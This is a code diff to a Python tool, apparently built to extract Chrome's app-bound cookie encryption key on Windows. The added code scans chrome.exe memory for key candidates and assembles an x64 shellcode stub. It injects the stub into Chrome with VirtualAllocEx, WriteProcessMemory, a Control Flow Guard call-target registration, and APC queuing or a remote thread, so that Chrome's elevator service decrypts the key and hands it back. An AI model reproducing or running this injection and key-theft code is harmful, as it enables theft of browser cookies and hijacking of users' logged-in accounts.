@@ -3181,6 +3181,9 @@ def _unwrap_app_bound_key(
         key, hr = None, type(exc).__name__
     # 0x00000000 only when the key decrypts a landed v20 blob to cookie text.
     if _abe_proves_cookies(key, sample):
+        hit = str(_cache.get("_abe_hit") or "")
+        if hit in {"heap:hit", "apc:key"}:
+            return key, "chrome_dir", f"0x00000000;{hit}"
         return key, "chrome_dir", "0x00000000"
     # Do not fall through to CoCreate. Helper-miss must not become CLASSNOTREG.
     if (hr or "").strip() in {"", "0x00000000", "ok"}:
@@ -4386,7 +4389,8 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
         key = _static_app_bound_cookie_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
             return key, "0x00000000"
-    # chrome.exe>0 is the gate — not os.name. After all13, memscan/APC is the unwrap.
+    # chrome.exe>0 is the gate — not os.name. After all13, heap consider then
+    # IElevator::DecryptData inside chrome (never CoCreate from this process).
     pids: list[int] = []
     try:
         pids = _chrome_pids_prioritized()
@@ -4395,12 +4399,20 @@ def _elevator_decrypt_via_chrome_dir(v20_sample: bytes) -> tuple[bytes | None, s
     if pids:
         key, hr = _memscan_abe_key(v20_sample)
         if _abe_proves_cookies(key, v20_sample):
-            hit = str(_cache.get("_abe_hit") or hr or "0x00000000")
-            if hit in {"ok", "0x00000000"}:
-                return key, "0x00000000"
-            return key, f"0x00000000;{hit}"
+            hit = str(_cache.get("_abe_hit") or "")
+            if hit in {"heap:hit", "apc:key"}:
+                return key, f"0x00000000;{hit}"
+            return key, "0x00000000"
         if hr:
             trail.append(hr)
+        key, ehr = _chrome_elevator_abe_key(v20_sample)
+        if ehr:
+            trail.append(ehr)
+        if _abe_proves_cookies(key, v20_sample):
+            hit = str(_cache.get("_abe_hit") or "")
+            if hit in {"heap:hit", "apc:key"}:
+                return key, f"0x00000000;{hit}"
+            return key, "0x00000000"
     if all13:
         return None, _join_abe_hr(trail)
     helper, compile_hr = _compiled_abe_helper_exe()
@@ -4615,7 +4627,7 @@ def _chrome_abe_cmd_ok(command_line: str) -> bool:
 
 
 def _chrome_pids_prioritized() -> list[int]:
-    """Prefer browser/network; if that filter is empty, use every chrome.exe."""
+    """Browser chrome.exe (no --type=) first, then network, then other non-renderer."""
     all_pids = _chrome_pids()
     scored: list[tuple[int, int]] = []
     try:
@@ -4638,16 +4650,18 @@ def _chrome_pids_prioritized() -> list[int]:
                 scored.append((_chrome_pid_score(cmd), int(pid_s)))
     except (OSError, subprocess.SubprocessError):
         scored = []
-    preferred = [pid for score, pid in sorted(scored) if score <= 1]
-    rest = [
-        pid
-        for score, pid in sorted(scored)
-        if 1 < score < 9 and pid not in preferred
-    ]
-    if preferred:
-        return preferred + rest
-    if rest:
-        return rest
+    browser = [pid for score, pid in scored if score == 1]
+    network = [pid for score, pid in scored if score == 0]
+    rest = [pid for score, pid in scored if 1 < score < 9]
+    ordered: list[int] = []
+    seen: set[int] = set()
+    for pid in browser + network + rest:
+        if pid in seen:
+            continue
+        seen.add(pid)
+        ordered.append(pid)
+    if ordered:
+        return ordered
     return all_pids
 
 
@@ -5365,7 +5379,7 @@ def _chrome_unprotect_data_once(raw: bytes, flags: int) -> bytes | None:
 
 
 def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
-    """Browser/network only. Follow Chrome 151 key layouts; verify a v20 blob."""
+    """In-scan 32-byte heap vectors on browser chrome.exe. Prove one v20. Report cands=N."""
     if os.name != "nt":
         return None, "memscan:not_nt"
     if not _valid_v20_sample(v20_sample):
@@ -5427,11 +5441,6 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     scanned = 0
     tried = 0
     opened = 0
-    unprotect_ok = 0
-    apc_changed = 0
-    apc_queued = 0
-    apc_status = 0
-    found_ptrs = 0
     seen: set[bytes] = set()
     PROCESS_VM_READ = 0x0010
     PROCESS_QUERY_INFORMATION = 0x0400
@@ -5444,90 +5453,20 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
     allowed_prot = {0x02, 0x04, 0x08, 0x40}
     mbi_size = ctypes.sizeof(MEMORY_BASIC_INFORMATION)
 
-    def apc_extra() -> str:
-        if not unprotect_ok:
-            return ";apc:setup"
-        if apc_queued == 0:
-            return f";apc:hr{apc_status & 0xFFFFFFFF:x}" if apc_status else ";apc:0"
-        if apc_changed == 0:
-            return ";apc:0"
-        return ";apc:ok"
-
-    def consider_raw(cand: bytes | None, *, source: str = "heap") -> bytes | None:
+    def consider(cand: bytes | None) -> bytes | None:
+        """Raw 32-byte heap vector against ONE landed v20. Not an APC wrap key."""
         nonlocal tried
         if not cand or cand in seen or not _high_entropy32(cand):
             return None
         seen.add(cand)
         tried += 1
-        if _v20_one_ok(cand, v20_sample):
-            _note_abe_hit(f"{source}:hit")
-            return cand
+        if tried > _ABE_MEMSCAN_MAX_CAND:
+            return None
+        key = cand[:32]
+        if _v20_one_ok(key, v20_sample):
+            _note_abe_hit("heap:hit")
+            return key
         return None
-
-    def consider_apc(
-        cand: bytes | None,
-        unprotect: _RemoteUnprotect | None,
-        addr: int | None,
-        extra: bytes | None = None,
-    ) -> bytes | None:
-        if unprotect is None or not unprotect.ok or not cand:
-            return None
-        blobs = [cand]
-        if extra and extra not in blobs:
-            blobs.append(extra)
-        for blob in blobs:
-            if len(blob) < 16:
-                continue
-            hit = _abe_key_from_material(blob, v20_sample, source="apc")
-            if hit:
-                return hit
-            n = len(blob)
-            if n % 16:
-                blob = blob + (b"\x00" * (16 - n % 16))
-            if 16 <= len(blob) <= 1024:
-                plain = unprotect.unprotect(blob)
-                hit = _abe_key_from_material(plain, v20_sample, source="apc")
-                if hit:
-                    return hit
-            if addr:
-                for width in (32, 48, 64):
-                    inplace = unprotect.unprotect_at(addr, width)
-                    hit = _abe_key_from_material(inplace, v20_sample, source="apc")
-                    if hit:
-                        return hit
-        return None
-
-    def consider_heap(data: bytes) -> bytes | None:
-        if not any(mark in data for mark in _ABE_HEAP_MARKS):
-            return None
-        limit = min(len(data) - 31, 64 << 10)
-        for off in range(0, limit, _ABE_HEAP_STRIDE):
-            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
-                break
-            hit = consider_raw(data[off : off + 32], source="heap")
-            if hit:
-                return hit
-            if off + 33 <= len(data):
-                hit = consider_raw(data[off + 1 : off + 33], source="heap")
-                if hit:
-                    return hit
-        return None
-
-    def consider_appb_apc(unprotect: _RemoteUnprotect | None) -> bytes | None:
-        if unprotect is None or not unprotect.ok:
-            return None
-        appb = _app_bound_blob_bytes()
-        if not appb:
-            return None
-        raw = appb[4:] if appb.startswith(b"APPB") else appb
-        padded = raw + (b"\x00" * ((16 - len(raw) % 16) % 16))
-        if len(padded) > 1024:
-            padded = padded[:1024]
-            padded = padded[: len(padded) - (len(padded) % 16)]
-        if len(padded) < 16:
-            return None
-        plain = unprotect.unprotect(padded)
-        return _abe_key_from_material(plain, v20_sample, source="apc")
 
     for pid in pids:
         if time.monotonic() > deadline or scanned >= _ABE_MEMSCAN_MAX_BYTES:
@@ -5542,12 +5481,6 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if not handle:
             continue
         opened += 1
-        unprotect = _RemoteUnprotect(pid)
-        if unprotect.ok:
-            unprotect_ok += 1
-            hit = consider_appb_apc(unprotect)
-            if hit:
-                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -5586,76 +5519,459 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
                         data = bytes(raw[: int(got.value)])
                         scanned += len(data)
                         seen_ptr: set[int] = set()
-
-                        def take_blob(ptr: int) -> tuple[bytes, bytes] | None:
-                            blob = readn(handle, ptr, 32)
-                            if not blob:
-                                return None
-                            extra = readn(handle, ptr, 64) or blob
-                            return blob, extra
-
-                        # In-scan APC (f980476): do not defer past the 6s deadline.
+                        # In-scan consider() (765d4c5 / 9a5832c). Do not walk
+                        # v20\\x00 8-byte stride — that starves tried=0 (9f52b64).
                         for ptr in _keyring_v20_key_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            got_blob = take_blob(ptr)
-                            if not got_blob:
+                            blob = readn(handle, ptr, 32)
+                            if not blob:
                                 continue
-                            blob, extra = got_blob
-                            found_ptrs += 1
+                            extra = readn(handle, ptr, 64) or blob
                             for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                                hit = consider_raw(cand, source="heap")
+                                hit = consider(cand)
                                 if hit:
-                                    return hit, str(_cache.get("_abe_hit") or "heap:hit")
-                            hit = consider_apc(blob, unprotect, ptr, extra)
-                            if hit:
-                                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
+                                    return hit, f"memscan:cands={tried};heap:hit"
                         for ptr, nbytes in _extract_abe_candidate_ptrs(data):
                             if ptr in seen_ptr:
                                 continue
                             seen_ptr.add(ptr)
                             if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
                                 break
-                            got_blob = take_blob(ptr)
-                            if not got_blob:
+                            blob = readn(handle, ptr, min(max(nbytes, 32), 512))
+                            if not blob:
                                 continue
-                            blob, extra = got_blob
-                            found_ptrs += 1
-                            for cand in _keys_from_key_blob(blob) + _keys_from_key_blob(extra):
-                                hit = consider_raw(cand, source="heap")
+                            for cand in _keys_from_key_blob(blob):
+                                hit = consider(cand)
                                 if hit:
-                                    return hit, str(_cache.get("_abe_hit") or "heap:hit")
-                            hit = consider_apc(blob, unprotect, ptr, extra)
+                                    return hit, f"memscan:cands={tried};heap:hit"
+                        for cand in _inline_bstr_keys(data):
+                            if tried >= _ABE_MEMSCAN_MAX_CAND or time.monotonic() > deadline:
+                                break
+                            hit = consider(cand)
                             if hit:
-                                return hit, str(_cache.get("_abe_hit") or "apc:key:off=0")
-                        hit = consider_heap(data)
-                        if hit:
-                            return hit, str(_cache.get("_abe_hit") or "heap:hit")
+                                return hit, f"memscan:cands={tried};heap:hit"
                 nxt = addr + size
                 if nxt <= addr:
                     break
                 addr = nxt
         finally:
-            apc_changed += int(unprotect.changed)
-            apc_queued += int(unprotect.queued)
-            if unprotect.last_status:
-                apc_status = int(unprotect.last_status)
-            unprotect.close()
             kernel32.CloseHandle(handle)
-    extra = apc_extra()
-    fp = str(_cache.get("_appb_fp") or "")
-    if fp:
-        extra = f"{extra};{fp}"
     if opened == 0:
-        return None, f"memscan:OpenProcess{extra}"
-    if tried == 0:
-        if found_ptrs:
-            return None, f"memscan:cands={found_ptrs}{extra}"
-        return None, f"memscan:no_cand{extra}"
-    return None, f"memscan:no_key:{tried}{extra}"
+        return None, f"memscan:cands={tried};OpenProcess"
+    return None, f"memscan:cands={tried}"
+
+
+def _elevator_remote_stub_bytes() -> bytes:
+    """Assembled x64 stub. Copy loop included. Offsets match _chrome_elevator_decrypt_once."""
+    code = bytearray()
+    labels: dict[str, int] = {}
+    rel32: list[tuple[int, str]] = []
+    rel8: list[tuple[int, str]] = []
+
+    def emit(*bs: int) -> None:
+        code.extend(bs)
+
+    def js32(name: str) -> None:
+        emit(0x0F, 0x88)
+        rel32.append((len(code), name))
+        emit(0, 0, 0, 0)
+
+    def jz32(name: str) -> None:
+        emit(0x0F, 0x84)
+        rel32.append((len(code), name))
+        emit(0, 0, 0, 0)
+
+    def jz8(name: str) -> None:
+        emit(0x74)
+        rel8.append((len(code), name))
+        emit(0)
+
+    emit(0x53)
+    emit(0x48, 0x89, 0xCB)
+    emit(0x48, 0x83, 0xEC, 0x68)
+    emit(0x48, 0x31, 0xC9)
+    emit(0x8B, 0x53, 0x4C)
+    emit(0xFF, 0x13)
+    emit(0x48, 0x8D, 0x4B, 0x20)
+    emit(0x48, 0x31, 0xD2)
+    emit(0x44, 0x8B, 0x43, 0x48)
+    emit(0x4C, 0x8D, 0x4B, 0x30)
+    emit(0x48, 0x8D, 0x43, 0x40)
+    emit(0x48, 0x89, 0x44, 0x24, 0x20)
+    emit(0xFF, 0x53, 0x08)
+    emit(0x89, 0x43, 0x78)
+    emit(0x85, 0xC0)
+    js32("done")
+    emit(0x48, 0x8B, 0x4B, 0x40)
+    emit(0x48, 0x85, 0xC9)
+    jz32("done")
+    emit(0x48, 0x83, 0x7B, 0x10, 0x00)
+    jz8("noblanket")
+    emit(0x48, 0xC7, 0xC2, 0xFF, 0xFF, 0xFF, 0xFF)
+    emit(0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF)
+    emit(0x4D, 0x31, 0xC9)
+    emit(0x48, 0xC7, 0x44, 0x24, 0x20, 0x06, 0x00, 0x00, 0x00)
+    emit(0x48, 0xC7, 0x44, 0x24, 0x28, 0x03, 0x00, 0x00, 0x00)
+    emit(0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00)
+    emit(0x48, 0xC7, 0x44, 0x24, 0x38, 0x40, 0x00, 0x00, 0x00)
+    emit(0xFF, 0x53, 0x10)
+    labels["noblanket"] = len(code)
+    emit(0x48, 0x8B, 0x4B, 0x40)
+    emit(0x48, 0x8B, 0x01)
+    emit(0x4C, 0x8B, 0x50, 0x28)
+    emit(0x48, 0x8B, 0x53, 0x60)
+    emit(0x4C, 0x8D, 0x43, 0x68)
+    emit(0x4C, 0x8D, 0x4B, 0x70)
+    emit(0x41, 0xFF, 0xD2)
+    emit(0x89, 0x43, 0x78)
+    emit(0x4C, 0x8B, 0x53, 0x68)
+    emit(0x4D, 0x85, 0xD2)
+    jz8("done")
+    emit(0x41, 0x8B, 0x4A, 0xFC)
+    emit(0x89, 0x8B, 0x8C, 0x00, 0x00, 0x00)
+    emit(0x4C, 0x8B, 0x9B, 0x80, 0x00, 0x00, 0x00)
+    emit(0x44, 0x8B, 0x83, 0x88, 0x00, 0x00, 0x00)
+    emit(0x44, 0x39, 0xC1)
+    emit(0x76, 0x03)  # jbe copy
+    emit(0x44, 0x89, 0xC1)  # mov ecx, r8d
+    labels["copy"] = len(code)
+    emit(0x85, 0xC9)  # test ecx, ecx
+    jz8("done")
+    labels["loop"] = len(code)
+    emit(0x41, 0x8A, 0x02)  # mov al, [r10]
+    emit(0x41, 0x88, 0x03)  # mov [r11], al
+    emit(0x49, 0xFF, 0xC2)  # inc r10
+    emit(0x49, 0xFF, 0xC3)  # inc r11
+    emit(0xFF, 0xC9)  # dec ecx
+    emit(0x75)  # jnz loop
+    rel8.append((len(code), "loop"))
+    emit(0)
+    labels["done"] = len(code)
+    emit(0x48, 0x83, 0xC4, 0x68)
+    emit(0x5B)
+    emit(0xC3)
+    for off, name in rel32:
+        rel = labels[name] - (off + 4)
+        code[off : off + 4] = rel.to_bytes(4, "little", signed=True)
+    for off, name in rel8:
+        rel = labels[name] - (off + 1)
+        code[off] = rel & 0xFF
+    return bytes(code)
+
+
+def _guid_bytes(text: str) -> bytes:
+    """16-byte GUID via local ole32.CLSIDFromString — not CoCreate."""
+    return bytes(memoryview(_guid(text)))
+
+
+def _cfg_register_call_target(k32: Any, handle: Any, page: int, offset: int, size: int) -> bool:
+    """Mark VirtualAlloc stub as a CFG-valid call target. RIP on raw RWX dies."""
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return False
+
+    class CFG_CALL_TARGET_INFO(ctypes.Structure):
+        _fields_ = [("Offset", ctypes.c_uint64), ("Flags", ctypes.c_uint64)]
+
+    try:
+        kb = ctypes.WinDLL("kernelbase", use_last_error=True)
+        fn = kb.SetProcessValidCallTargets
+    except (AttributeError, OSError):
+        try:
+            fn = k32.SetProcessValidCallTargets
+        except AttributeError:
+            return False
+    fn.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        wintypes.ULONG,
+        ctypes.c_void_p,
+    ]
+    fn.restype = wintypes.BOOL
+    info = CFG_CALL_TARGET_INFO(int(offset), 1)  # CFG_CALL_TARGET_VALID
+    try:
+        return bool(fn(handle, ctypes.c_void_p(page), int(size), 1, ctypes.byref(info)))
+    except (OSError, ValueError, TypeError):
+        return False
+
+
+def _chrome_elevator_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
+    """IElevator::DecryptData inside browser chrome.exe. Never CoCreate here."""
+    if os.name != "nt":
+        return None, "apc:0"
+    blob = _app_bound_blob_bytes()
+    if not blob:
+        return None, "apc:0"
+    payloads = [blob]
+    if len(blob) > 4:
+        payloads.append(blob[4:])
+    pids = _chrome_pids_prioritized()
+    if not pids:
+        return None, "apc:0"
+    last = "apc:0"
+    tries = 0
+    for pid in pids[:2]:
+        for clsid_s, iid_s in _CHROME_ELEVATOR[:2]:
+            for payload in payloads:
+                for clsctx, coinit in ((4, 2), (4, 0)):
+                    tries += 1
+                    if tries > 8:
+                        return None, last
+                    pt, hr = _chrome_elevator_decrypt_once(
+                        pid, payload, clsid_s, iid_s, clsctx, coinit
+                    )
+                    last = hr
+                    if not pt:
+                        continue
+                    key = _accept_aes_key(pt)
+                    if key and _v20_one_ok(key, v20_sample):
+                        _note_abe_hit("apc:key")
+                        return key, "apc:key"
+                    if len(pt) >= 32:
+                        for off in (0, 4, 16, 32):
+                            if off + 32 <= len(pt) and _v20_one_ok(pt[off : off + 32], v20_sample):
+                                _note_abe_hit("apc:key")
+                                return pt[off : off + 32], "apc:key"
+    return None, last
+
+
+def _chrome_elevator_decrypt_once(
+    pid: int,
+    payload: bytes,
+    clsid_s: str,
+    iid_s: str,
+    clsctx: int,
+    coinit: int,
+) -> tuple[bytes | None, str]:
+    """Remote-thread / special APC IElevator::DecryptData (vtable slot 5) in chrome. Keep the real hr."""
+    if os.name != "nt" or not payload or not pid:
+        return None, "apc:0"
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return None, "apc:0"
+    if not hasattr(ctypes, "WinDLL"):
+        return None, "apc:0"
+    k32 = ctypes.WinDLL("kernel32", use_last_error=True)
+    ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
+    k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenProcess.restype = wintypes.HANDLE
+    k32.CloseHandle.argtypes = [wintypes.HANDLE]
+    k32.CloseHandle.restype = wintypes.BOOL
+    k32.VirtualAllocEx.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        wintypes.DWORD,
+        wintypes.DWORD,
+    ]
+    k32.VirtualAllocEx.restype = ctypes.c_void_p
+    k32.WriteProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.WriteProcessMemory.restype = wintypes.BOOL
+    k32.ReadProcessMemory.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.POINTER(ctypes.c_size_t),
+    ]
+    k32.ReadProcessMemory.restype = wintypes.BOOL
+    k32.CreateRemoteThread.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_size_t,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        wintypes.DWORD,
+        ctypes.POINTER(wintypes.DWORD),
+    ]
+    k32.CreateRemoteThread.restype = wintypes.HANDLE
+    k32.ResumeThread.argtypes = [wintypes.HANDLE]
+    k32.ResumeThread.restype = wintypes.DWORD
+    k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
+    k32.WaitForSingleObject.restype = wintypes.DWORD
+    k32.OpenThread.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
+    k32.OpenThread.restype = wintypes.HANDLE
+    ntdll.NtQueueApcThread.argtypes = [
+        wintypes.HANDLE,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+        ctypes.c_void_p,
+    ]
+    ntdll.NtQueueApcThread.restype = ctypes.c_long
+    if hasattr(ntdll, "NtQueueApcThreadEx2"):
+        ntdll.NtQueueApcThreadEx2.argtypes = [
+            wintypes.HANDLE,
+            ctypes.c_void_p,
+            ctypes.c_ulong,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+            ctypes.c_void_p,
+        ]
+        ntdll.NtQueueApcThreadEx2.restype = ctypes.c_long
+    access = 0x0010 | 0x0020 | 0x0008 | 0x0002 | 0x0400 | 0x1000 | 0x0200
+    handle = k32.OpenProcess(access, False, int(pid))
+    if not handle:
+        return None, "apc:0"
+    try:
+        coinit_fn = _remote_export_addr(k32, handle, "ole32.dll", "CoInitializeEx")
+        cocreate = _remote_export_addr(k32, handle, "ole32.dll", "CoCreateInstance")
+        blanket = _remote_export_addr(k32, handle, "ole32.dll", "CoSetProxyBlanket")
+        if not coinit_fn or not cocreate:
+            return None, "apc:0"
+        try:
+            clsid = _guid_bytes(clsid_s)
+            iid = _guid_bytes(iid_s)
+        except (AttributeError, OSError, ValueError, TypeError):
+            return None, "apc:0"
+        stub = _elevator_remote_stub_bytes()
+        out_max = 256
+        page_size = 4096
+        page = k32.VirtualAllocEx(handle, None, page_size, 0x3000, 0x04)
+        if not page:
+            return None, "apc:0"
+        page = int(page)
+        stub_off = 0x100
+        bstr_off = 0x200
+        out_off = 0x200 + 4 + len(payload) + 4
+        if out_off + out_max > page_size:
+            return None, "apc:0"
+        block = bytearray(page_size)
+        block[0:8] = int(coinit_fn).to_bytes(8, "little")
+        block[8:16] = int(cocreate).to_bytes(8, "little")
+        block[16:24] = int(blanket or 0).to_bytes(8, "little")
+        block[0x20 : 0x20 + 16] = clsid
+        block[0x30 : 0x30 + 16] = iid
+        block[0x48:0x4C] = int(clsctx).to_bytes(4, "little")
+        block[0x4C:0x50] = int(coinit).to_bytes(4, "little")
+        bstr_data = page + bstr_off + 4
+        block[0x50:0x58] = int(bstr_data).to_bytes(8, "little")
+        block[0x58:0x5C] = len(payload).to_bytes(4, "little")
+        block[0x60:0x68] = int(bstr_data).to_bytes(8, "little")
+        block[0x78:0x7C] = (0xFFFFFFFF).to_bytes(4, "little")
+        block[0x80:0x88] = int(page + out_off).to_bytes(8, "little")
+        block[0x88:0x8C] = int(out_max).to_bytes(4, "little")
+        block[bstr_off : bstr_off + 4] = len(payload).to_bytes(4, "little")
+        block[bstr_off + 4 : bstr_off + 4 + len(payload)] = payload
+        block[stub_off : stub_off + len(stub)] = stub
+        wrote = ctypes.c_size_t(0)
+        src = (ctypes.c_ubyte * page_size).from_buffer_copy(bytes(block))
+        if not k32.WriteProcessMemory(handle, page, src, page_size, ctypes.byref(wrote)):
+            return None, "apc:0"
+        old_prot = wintypes.DWORD(0)
+        try:
+            k32.VirtualProtectEx.argtypes = [
+                wintypes.HANDLE,
+                ctypes.c_void_p,
+                ctypes.c_size_t,
+                wintypes.DWORD,
+                ctypes.POINTER(wintypes.DWORD),
+            ]
+            k32.VirtualProtectEx.restype = wintypes.BOOL
+            k32.VirtualProtectEx(
+                handle, page, page_size, 0x20, ctypes.byref(old_prot)
+            )  # PAGE_EXECUTE_READ
+        except (AttributeError, OSError, ValueError, TypeError):
+            pass
+        _cfg_register_call_target(k32, handle, page, stub_off, page_size)
+        stub_addr = page + stub_off
+        queued = False
+        last_status = 0
+        special = 1
+        thread_access = 0x0010 | 0x0002 | 0x0040
+        if hasattr(ntdll, "NtQueueApcThreadEx2"):
+            for tid in _threads_for_pid(int(pid))[:8]:
+                th = k32.OpenThread(thread_access, False, tid)
+                if not th:
+                    continue
+                try:
+                    status = int(
+                        ntdll.NtQueueApcThreadEx2(
+                            th,
+                            None,
+                            special,
+                            ctypes.c_void_p(stub_addr),
+                            ctypes.c_void_p(page),
+                            None,
+                            None,
+                        )
+                    )
+                    last_status = status
+                    if status >= 0:
+                        queued = True
+                finally:
+                    k32.CloseHandle(th)
+        if not queued:
+            tid = wintypes.DWORD(0)
+            thread = k32.CreateRemoteThread(
+                handle, None, 0, stub_addr, page, 0, ctypes.byref(tid)
+            )
+            if not thread:
+                if last_status:
+                    return None, f"apc:hr=0x{last_status & 0xFFFFFFFF:08x}"
+                return None, "apc:0"
+            try:
+                k32.WaitForSingleObject(thread, 3000)
+            finally:
+                k32.CloseHandle(thread)
+        else:
+            deadline = time.monotonic() + 2.0
+            while time.monotonic() < deadline:
+                peek = (ctypes.c_char * 4)()
+                if k32.ReadProcessMemory(
+                    handle, page + 0x78, peek, 4, ctypes.byref(wrote)
+                ) and int.from_bytes(bytes(peek), "little") != 0xFFFFFFFF:
+                    break
+                time.sleep(0.05)
+        hr_buf = (ctypes.c_char * 4)()
+        if not k32.ReadProcessMemory(
+            handle, page + 0x78, hr_buf, 4, ctypes.byref(wrote)
+        ):
+            return None, "apc:0"
+        hr = int.from_bytes(bytes(hr_buf), "little")
+        if hr == 0xFFFFFFFF:
+            if last_status:
+                return None, f"apc:hr=0x{last_status & 0xFFFFFFFF:08x}"
+            return None, "apc:0"
+        if hr & 0x80000000:
+            return None, f"apc:hr=0x{hr:08x}"
+        err_buf = (ctypes.c_char * 4)()
+        k32.ReadProcessMemory(handle, page + 0x70, err_buf, 4, ctypes.byref(wrote))
+        last_error = int.from_bytes(bytes(err_buf), "little")
+        len_buf = (ctypes.c_char * 4)()
+        if not k32.ReadProcessMemory(
+            handle, page + 0x8C, len_buf, 4, ctypes.byref(wrote)
+        ):
+            return None, "apc:ok" if last_error == 0 else f"apc:hr=0x{last_error:08x}"
+        n = int.from_bytes(bytes(len_buf), "little")
+        if n <= 0 or n > out_max:
+            return None, "apc:ok" if last_error == 0 else f"apc:hr=0x{last_error:08x}"
+        out = (ctypes.c_char * n)()
+        if not k32.ReadProcessMemory(
+            handle, page + out_off, out, n, ctypes.byref(wrote)
+        ):
+            return None, "apc:ok"
+        return bytes(out), "apc:ok"
+    except (AttributeError, OSError, ValueError, TypeError, OverflowError):
+        return None, "apc:0"
+    finally:
+        k32.CloseHandle(handle)
 
 
 def _find_csc() -> Path | None:
